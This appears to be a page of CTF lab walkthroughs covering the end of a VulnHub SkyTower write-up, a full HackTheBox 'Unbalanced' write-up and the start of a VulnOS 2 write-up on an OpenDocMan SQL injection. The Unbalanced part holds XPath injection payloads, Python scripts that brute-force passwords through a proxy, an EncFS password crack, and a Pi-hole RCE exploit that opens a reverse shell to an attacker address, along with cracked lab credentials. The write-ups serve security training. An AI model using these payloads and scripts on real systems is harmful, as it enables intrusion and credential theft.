|D-chain|-<>-192.168.56.101:3128-<>-127.0.0.1:1080-<--denied
|D-chain|-<>-192.168.56.101:3128-<><>-127.0.0.1:22-<><>-OK
Enter passphrase for key '/root/.ssh/id_rsa': 
root@127.0.0.1's password: 
root@SkyTower:~# id
uid=0(root) gid=0(root) groups=0(root)
root@SkyTower:~# whoami
root
root@SkyTower:~# ls
flag.txt
root@SkyTower:~# cat flag.txt 
Congratz, have a cold one to celebrate!
root password is theskytower
root@SkyTower:~#
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub252.jpg)

#### 知识点总结

 - sql注入绕过过滤
 - 使用proxychains代理http-proxy连接被过滤的ssh端口

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>


















<!-- kb:end SkyTower-1 -->

</details>

<a id="case-unbalanced"></a>

## EncFS 配置与 XPath 查询

Rsync 与 EncFS 恢复代理配置，负载均衡后的不同节点影响 XPath 注入响应。Pi-hole 的后续执行与口令材料保留。

<p class="kb-provenance">来源 Unbalanced · 原记录 2020-08-17 · 32 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-unbalanced">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Unbalanced -->

#### introduce

OS: Linux
Difficulty: Hard
Points:	40
Release:	01 Aug 2020
IP:	10.10.10.200

User Blood : InfoSecJack	00 days, 01 hours, 49 mins, 26 seconds.
Root Blood : snowscan	00 days, 02 hours, 09 mins, 09 seconds.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb60.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
root@kali:~# nmap -sC -sV -p- 10.10.10.200 -v --min-rate=10000
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Rsync

``` bash
root@kali:~/hackthebox/machine/unbalanced# nc -vn 10.10.10.200 873
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.200:873.
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
conf_backups    EncFS-encrypted configuration backups
@RSYNCD: EXIT
exit
Ncat: Broken pipe.
```

Downloading the files:

``` bash
root@kali:~/hackthebox/machine/unbalanced# rsync -av rsync://10.10.10.200/conf_backups files
receiving incremental file list
created directory files
./
,CBjPJW4EGlcqwZW4nmVqBA6
-FjZ6-6,Fa,tMvlDsuVAO7ek
.encfs6.xml
0K72OfkNRRx3-f0Y6eQKwnjn
27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
2VyeljxHWrDX37La6FhUGIJS
3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
3cdBkrRF7R5bYe1ZJ0KYy786
3xB4vSQH-HKVcOMQIs02Qb9,
4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
5FTRnQDoLdRfOEPkrhM2L29P
5IUA28wOw0wwBs8rP5xjkFSs
6R1rXixtFRQ5c9ScY8MBQ1Rg
7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
8CBL-MBKTDMgB6AT2nfWfq-e
8XDA,IOhFFlhh120yl54Q0da
8e6TAzw0xs2LVxgohuXHhWjM
9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
A4qOD1nvqe9JgKnslwk1sUzO
Acv0PEQX8vs-KdK307QNHaiF
B6J5M3OP0X7W25ITnaZX753T
Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
ECXONXBBRwhb5tYOIcjjFZzh
F4F9opY2nhVVnRgiQ,OUs-Y0
FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
FSXWRSwW6vOvJ0ExPK0fXJ6F
IymL3QugM,XxLuKEdwJJOOpi
KPYfvxIoOlrRjTY18zi8Wne-
Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
Kpo3MHQxksW2uYX79XngQu-f
KtFc,DR7HqmGdPOkM2CpLaM9
Mv5TtpmUNnVl-fgqQeYAy8uu
MxgjShAeN6AmkH2tQAsfaj6C
Ni8LDatT134DF6hhQf5ESpo5
Nlne5rpWkOxkPNC15SEeJ8g,
OFG2vAoaW3Tvv1X2J5fy4UV8
OvBqims-kvgGyJJqZ59IbGfy
StlxkG05UY9zWNHBhXxukuP9
TZGfSHeAM42o9TgjGUdOSdrd
VQjGnKU1puKhF6pQG1aah6rc
W5,ILrUB4dBVW-Jby5AUcGsz
Wr0grx0GnkLFl8qT3L0CyTE6
X93-uArUSTL,kiJpOeovWTaP
Ya30M5le2NKbF6rD-qD3M-7t
Yw0UEJYKN,Hjf-QGqo3WObHy
Z8,hYzUjW0GnBk1JP,8ghCsC
ZXUUpn9SCTerl0dinZQYwxrx
ZvkMNEBKPRpOHbGoefPa737T
a4zdmLrBYDC24s9Z59y-Pwa2
c9w3APbCYWfWLsq7NFOdjQpA
cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
dF2GU58wFl3x5R7aDE6QEnDj
dNTEvgsjgG6lKBr8ev8Dw,p7
gK5Z2BBMSh9iFyCFfIthbkQ6
gRhKiGIEm4SvYkTCLlOQPeh-
hqZXaSCJi-Jso02DJlwCtYoz
iaDKfUAHJmdqTDVZsmCIS,Bn
jIY9q65HMBxJqUW48LJIc,Fj
kdJ5whfqyrkk6avAhlX-x0kh
kheep9TIpbbdwNSfmNU1QNk-
l,LY6YoFepcaLg67YoILNGg0
lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
mMGincizgMjpsBjkhWq-Oy0D
oPu0EVyHA6,KmoI1T,LTs83x
pfTT,nZnCUFzyPPOeX9NwQVo
pn6YPUx69xqxRXKqg5B5D2ON
q5RFgoRK2Ttl3U5W8fjtyriX
qeHNkZencKDjkr3R746ZzO5K
sNiR-scp-DZrXHg4coa9KBmZ
sfT89u8dsEY4n99lNsUFOwki
uEtPZwC2tjaQELJmnNRTCLYU
vCsXjR1qQmPO5g3P3kiFyO84
waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5

sent 1,452 bytes  received 411,990 bytes  10,466.89 bytes/sec
total size is 405,603  speedup is 0.98
```

We can see these files are encrypted:

 - EncFS-encrypted

After searching on how to decrypt I found the following post how to decrypt the password:

 - [Breaking EncFS given .encfs6.xml](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml)

Getting the password:

``` bash
root@kali:~# cd /usr/share/john/
root@kali:/usr/share/john# python encfs2john.py /root/hackthebox/machine/unbalanced/files/ > /root/hackthebox/machine/unbalanced/encfs6.xml.john
root@kali:/usr/share/john# john --wordlist=/usr/share/wordlists/rockyou.txt --progress-every=3 --pot=s3cwalk.pot /root/hackthebox/machine/unbalanced/encfs6.xml.john
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 0.00% (ETA: 2020-08-20 04:24) 0g/s 61.34p/s 61.34c/s 61.34C/s alyssa..horses
0g 0:00:00:06 0.00% (ETA: 2020-08-20 09:26) 0g/s 61.53p/s 61.53c/s 61.53C/s jeffrey..jerome
0g 0:00:00:09 0.00% (ETA: 2020-08-20 11:45) 0g/s 62.60p/s 62.60c/s 62.60C/s evelyn..flores
bubblegum        (/root/hackthebox/machine/unbalanced/files/)
1g 0:00:00:11 DONE (2020-08-17 09:53) 0.08583g/s 63.17p/s 63.17c/s 63.17C/s bambam..raquel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

 - password is: bubblegum

 - Reading the files:

``` bash
apt-get install encfs
root@kali:~/hackthebox/machine/unbalanced# encfsctl export files decrypt
EncFS密码： 
目录decrypt不存在。
目录"decrypt" 不存在。要创建吗？(y,N) y
root@kali:~/hackthebox/machine/unbalanced# ls
decrypt  encfs6.xml.john  files
root@kali:~/hackthebox/machine/unbalanced# ls decrypt/
50-localauthority.conf              hdparm.conf                      parser.conf
50-nullbackend.conf                 host.conf                        protect-links.conf
51-debian-sudo.conf                 initramfs.conf                   reportbug.conf
70debconf                           input.conf                       resolv.conf
99-sysctl.conf                      journald.conf                    resolved.conf
access.conf                         kernel-img.conf                  rsyncd.conf
adduser.conf                        ldap.conf                        rsyslog.conf
bluetooth.conf                      ld.so.conf                       semanage.conf
ca-certificates.conf                libaudit.conf                    sepermit.conf
com.ubuntu.SoftwareProperties.conf  libc.conf                        sleep.conf
dconf                               limits.conf                      squid.conf
debconf.conf                        listchanges.conf                 sysctl.conf
debian.conf                         logind.conf                      system.conf
deluser.conf                        logrotate.conf                   time.conf
dhclient.conf                       main.conf                        timesyncd.conf
discover-modprobe.conf              mke2fs.conf                      ucf.conf
dkms.conf                           modules.conf                     udev.conf
dns.conf                            namespace.conf                   update-initramfs.conf
dnsmasq.conf                        network.conf                     user.conf
docker.conf                         networkd.conf                    user-dirs.conf
fakeroot-x86_64-linux-gnu.conf      nsswitch.conf                    Vendor.conf
framework.conf                      org.freedesktop.PackageKit.conf  wpa_supplicant.conf
fuse.conf                           PackageKit.conf                  x86_64-linux-gnu.conf
gai.conf                            pam.conf                         xattr.conf
group.conf                          pam_env.conf
```

then we get a lot of config files:

after enum it turns out we need the squid.conf

This is a huge file so use sed to grep only the active lines:

``` bash
root@kali:~/hackthebox/machine/unbalanced# sed '/^#/ d' < decrypt/squid.conf > readable.txt
root@kali:~/hackthebox/machine/unbalanced# cat readable.txt
...
a hostname: intranet.unbalanced.htb
a password: Thah$Sh1
```

got a password from squid and able to see more of the config

``` bash
root@kali:~/hackthebox/machine/unbalanced# squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Mon, 17 Aug 2020 15:07:05 GMT
Content-Type: text/plain;charset=utf-8
Expires: Mon, 17 Aug 2020 15:07:05 GMT
Last-Modified: Mon, 17 Aug 2020 15:07:05 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

FQDN Cache Statistics:
FQDNcache Entries In Use: 9
FQDNcache Entries Cached: 8
FQDNcache Requests: 96
FQDNcache Hits: 0
FQDNcache Negative Hits: 0
FQDNcache Misses: 96
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
```

#### Web/proxy

访问

``` bash
http://10.10.10.200:3128/
```

squid is running on port 3128

now setup the proxy and try to see if we can see the webpage

 - intranet.unbalanced.htb

 - configure foxy proxy:

set the browser to http protocal, ip 10.10.10.200, port 3128

after set up those configures, we can access the following webpage:

``` bash
http://intranet.unbalanced.htb/intranet.php
```

after some enum we couldn't find anything interesting but when look back at the squid config we can see something odd

``` bash
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
```

number one is missing,when we go to

``` bash
http://172.31.179.1
```

we get the following:

``` bash
Host temporarily taken out of load balancing for security maintenance. 
```

turns out this one is running, but not in the load balance and as we can see this is for a reason.

``` bash
http://172.31.179.1/intranet.php
```

get the same page, but the login form here is vulnerable to xpath injection:

payload

``` bash
'or''='
```

then we got the following things on the page:

``` bash
rita
Rita Fubelli
rita@unbalanced.htb
Role: HR Manager

jim
Jim Mickelson
jim@unbalanced.htb
Role: Web Designer

bryan
Bryan Angstrom
bryan@unbalanced.htb
Role: System Administrator

sarah
Sarah Goodman
sarah@unbalanced.htb
Role: Team Leader
```

with the following injection we are able to bruteforce our password
in the password field:

``` bash
'or substring(Password,1,1)='p' or'
```

So everyone that has the first letter p in the password will now be displayed on the page:

write a python script to bruteforce the password, the payload must be single character at a time

crack.py

``` bash
import requests

url = 'http://172.31.179.1/intranet.php'
proxy_url = 'http://10.10.10.200:3128'
w = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*(){}:"<>?'
u = ['rita','jim','bryan','sarah']

for user in u:
    data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password,0,1)='x"}
    request = requests.post(url, data=data, proxies={'http':proxy_url})
    b = len(request.text)
    cracked_pass = ''
    for i in range(1,80):
        found = False
        for c in w:
            data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password," + str(i) + ",1)='" + c + ""}
            request = requests.post(url, data=data, proxies={'http':proxy_url})
            if len(request.text) != b:
                found = True
                break
        if not found:
            break
        print('Attempting User {0}'.format(user))
    print('[+]Found character: {2}'.format(user, i, c))
    cracked_pass += c
    print(cracked_pass)
```

or crack1.py script

``` bash
import requests

url = "http://172.31.179.1/intranet.php"
proxy = "http://10.10.10.200:3128"
letters = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"
users = ['sarah', 'rita', 'jim', 'bryan']

for user in users:
	data = {"Username": '', "Password": "' or username= '" + user + "'or substring(Password,1,1)='p' or'"}
	request = requests.post(url, data=data, proxies={'http':proxy})	
	length = len(request.text)	
	p4ss = ''
	for i in range(1,25):		
		for l in letters:			
			data = {"Username": '', "Password": "' or username= '" + "{}".format(user) + "'or substring(Password,{},1)='{}' or'".format(str(i),l)}
			request1 = requests.post(url, data=data, proxies={'http':proxy})
			if "{}@unbalanced.htb".format(user) in request1.text and len(request1.text) != 6756:
				print("Got hit for User '{}' - Letter is '{}'".format(user, l))
				p4ss += l
				print(str(i))
				print(str(p4ss))
				pass
```

use burp intruder to bruteforce is also a great idea,

burp setup reference to

 - [sevwalk's unbalanced walkthrough](https://www.secwalk.com/active-htb-walkthroughs/htb-walkthrough-unbalanced-10-10-10-200/)

after run those scripts, we got:

``` bash
rita:password01!
jim:stairwaytoheaven
bryan:ireallyl0vebubblegum!!!
sarah:sarah4evah'
```

after tried them all, we got bryan user loged in to ssh

and get the user flag

``` bash
root@kali:~# ssh bryan@10.10.10.200
The authenticity of host '10.10.10.200 (10.10.10.200)' can't be established.
ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.200' (ECDSA) to the list of known hosts.
bryan@10.10.10.200's password: 
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 14:16:06 2020 from 10.10.10.4
bryan@unbalanced:~$ id
uid=1000(bryan) gid=1000(bryan) groups=1000(bryan)
bryan@unbalanced:~$ whoami
bryan
bryan@unbalanced:~$ ls
TODO  user.txt
bryan@unbalanced:~$ cat user.txt
51dfe0d5a9a3981ca4fdbfee0619d773
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb61.jpg)


#### Privilege Escalation

``` bash
bryan@unbalanced:~$ cat TODO 
############                                                                                         
# Intranet #                                                                                         
############                                                                                         
* Install new intranet-host3 docker [DONE]                                                           
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]                                  
* Test intranet-host3 [DONE]                                                                         
* Add intranet-host3 to load balancer [DONE]                                                         
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```

There was a suspicious TODO file in Bryan’s home folder. 
What is in progress is vulnerable. 
As it is, PiHole might be the hold for privilege escalation. 
PiHole server is running in docker and it can be only accessed through the localhost. Let’s find which port it is running.

``` bash
bryan@unbalanced:~$ ss -lnpt | grep 127.0.0.1
LISTEN    0         128              127.0.0.1:8080             0.0.0.0:*       
LISTEN    0         128              127.0.0.1:5553             0.0.0.0:*       
bryan@unbalanced:~$ curl http://127.0.0.1:5553/
^C
bryan@unbalanced:~$ curl http://127.0.0.1:8080/
[ERROR]: Unable to parse results from <i>queryads.php</i>: <code>Unhandled error message (<code>Invalid domain!</code>)</code>
```

seems like I need to find a domain for the PiHole server.
Then ran the linpeas enumeration script on the server.

``` bash
172.31.179.2 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:02 STALE
172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE
172.31.179.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:03 STALE
10.10.10.2 dev ens160 lladdr 00:50:56:b9:f9:ab REACHABLE
fe80::250:56ff:feb9:f9ab dev ens160 lladdr 00:50:56:b9:f9:ab router STALE
```

looks like we found the ip of the pi-hole webpage

``` bash
bryan@unbalanced:~$ curl 172.31.11.3

    <html><head>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
        <link rel='stylesheet' href='/pihole/blockingpage.css' type='text/css'/>
    </head><body id='splashpage'><img src='/admin/img/logo.svg'/><br/>Pi-<b>hole</b>: Your black hole for Internet advertisements<br><a href='/admin'>Did you mean to go to the admin panel?</a></body></html>
```

turn on the proxy again , see the webpage and are able to login in with the default creds:

login with: admin
``` bash
http://172.31.11.3/admin/
```

Found the following exploit for pi-hole:

 - [Pi-hole 4.4.0 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/48519)

Since the exploit is not configured to use a proxy server

we can do two things change the exploit or use ssh tunneling

``` bash
ssh -L 81:172.31.11.3:80 bryan@10.10.10.200
```

then browser to

``` bash
http://127.0.0.1:81/admin/
```

use the poc from github

 - [CVE-2020-8816](https://github.com/AndreyRainchik/CVE-2020-8816)

run the script then we got a reverse shell

``` bash
root@kali:~/hackthebox/machine/unbalanced# python exp2.py http://127.0.0.1:81 admin 10.10.14.5 3344
Attempting to verify if Pi-hole version is vulnerable
Logging in...
Login succeeded
Grabbing CSRF token
Attempting to read $PATH
Pihole is vulnerable and served's $PATH allows PHP
Sending payload
```

``` bash
root@kali:~# nc -lvp 3344
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::3344
Ncat: Listening on 0.0.0.0:3344
Ncat: Connection from 10.10.10.200.
Ncat: Connection from 10.10.10.200:38602.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

Boom! get a shell on the docker

#### Privilege Escalation–Information Disclosure–Root:

found password in script file

``` bash
bUbBl3gUm$43v3Ry0n3!
```

``` bash
$ cd /root
$ ls
ph_install.sh
pihole_config.sh
$ cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```

then we use the password to get root

wow! easy root!

``` bash
bryan@unbalanced:~$ su root
Password: 
root@unbalanced:/home/bryan# cd
root@unbalanced:~# id
uid=0(root) gid=0(root) groups=0(root)
root@unbalanced:~# whoami
root
root@unbalanced:~# ls
root.txt
root@unbalanced:~# cat root
cat: root: No such file or directory
root@unbalanced:~# cat root.txt 
9c9972cb01af0521dc17b015c30103c3
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb62.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb63.jpg)


#### Summary of knowledge

 - Rsync download files
 - EncFS password decrypted
 - sed grep the active lines
 - use squidclient to see more information
 - set http-proxy Squid http proxy to access the webpage
 - exploit with xpath injection
 - python script or burp intruder to fuzz xpath payload args
 - Pi-hole 4.4.0 - Remote Code Execution (Authenticated)
 - ssh tunneling port to 127.0.0.1
 - root password disclosure

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>

<!-- kb:end Unbalanced -->

</details>

<a id="case-vulnos-2"></a>

## OpenDocMan 参数与替代提权

CVE-2014-1945 的查询入口连接系统用户，OverlayFS 与 PostgreSQL/Blender 线索为不同本地路线。原文全部实验分支保留。

<p class="kb-provenance">来源 vulnos-2 · 原记录 2020-04-17 · 24 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-vulnos-2">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start vulnos-2 -->

#### 名称
名称：VulnOS: 2
发布日期：2016年5月17日

#### 下载

VulnOSv2.7z

 - Download (Mirror): https://download.vulnhub.com/vulnos/VulnOSv2.7z
 - Download (Torrent): https://download.vulnhub.com/vulnos/VulnOSv2.7z.torrent



#### 描述

VulnOS是打包为虚拟映像的一系列易受攻击的操作系统，以增强渗透测试技能

这是版本2-体积更小，混乱更少！由于时间并不总是站在我这一边，因此花了很长时间创建另一个VulnOS。但是喜欢创建它们。该映像是使用VBOX构建的。解压缩文件并将其添加到虚拟化软件中。

任务是渗透公司网站，获取系统root权限并得到最终的flag

注意：当前的键盘首选项为“pentesting是一个广泛的概念”如果有任何疑问，请随时通过m4db33f@gmail.com联系。向Vulnhub测试团队大声疾呼！希望你喜欢。

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.104
Host is up (0.00031s latency).
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -sV -p- -v 192.168.56.104
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
6667/tcp open  irc     ngircd
```

``` bash
root@kali:~# nmap -p 22,80,6667 -sV -v -A -T4 --script=vuln 192.168.56.104
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.104
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.104:80/jabc/?q=node/6
|     Form id: commerce-cart-add-to-cart-form-3
|     Form action: /jabc/?q=node/6
|     
|     Path: http://192.168.56.104:80/jabc/?q=node/4
|     Form id: commerce-cart-add-to-cart-form-1
|     Form action: /jabc/?q=node/4
|     
|     Path: http://192.168.56.104:80/jabc/?q=node/5
|     Form id: commerce-cart-add-to-cart-form-2
|_    Form action: /jabc/?q=node/5
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/?q=node%2f3%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/jabc/misc/?C=M%3bO%3dA%27%20OR%20sqlspider
|_    http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
6667/tcp open  irc     ngircd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
```

浏览器访问80端口的website链接

``` bash
http://192.168.56.104/jabc/
```

在此网页中，有许多选项卡，浏览了每个选项卡，包括其页面来源，除了最后一个选项卡（文档）之外，什么也没找到。

当查看页面源代码时，服务器上将显示一行“/jabd0cs/”。只需用guest/guest登录即可

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub267.jpg)

因此，打开目录并使用guest：guest作为用户名：password登录。

并且有一个上载选项，但有一个限制，即只能上载.doc文件，因此它几乎没有用。

如果观察登录页面，则有一个cms OpenDocMan v1.2.7。此版本的opendocman容易受到攻击。

搜索一下可用于opendocman的漏洞利用方法。对于这种类型：

``` bash
root@kali:~# searchsploit OpenDocMan 1.2.7
------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                      |  Path
                                                                                    | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------ ----------------------------------------
OpenDocMan 1.2.7 - Multiple Vulnerabilities                                         | exploits/php/webapps/32075.txt
------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

从其结果中，发现了利用32075.txt的漏洞，该漏洞显示“由于对“/ajax_udf.php”脚本中的“add_value” HTTP GET参数的验证不足而存在该漏洞。远程未经身份验证的攻击者可以在应用程序的数据库中执行任意SQL命令。”

现在查看一下exploit

``` bash
root@kali:~# cat /usr/share/exploitdb/exploits/php/webapps/32075.txt
Advisory ID: HTB23202
Product: OpenDocMan
Vendor: Free Document Management Software
Vulnerable Version(s): 1.2.7 and probably prior
Tested Version: 1.2.7
Advisory Publication: February 12, 2014 [without technical details]
Vendor Notification: February 12, 2014
Vendor Patch: February 24, 2014
Public Disclosure: March 5, 2014
Vulnerability Type: SQL Injection [CWE-89], Improper Access Control [CWE-284]
CVE References: CVE-2014-1945, CVE-2014-1946
Risk Level: High
CVSSv2 Base Scores: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P), 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

------------------------------------------------------------------------
-----------------------

Advisory Details:
                                                                                                                             
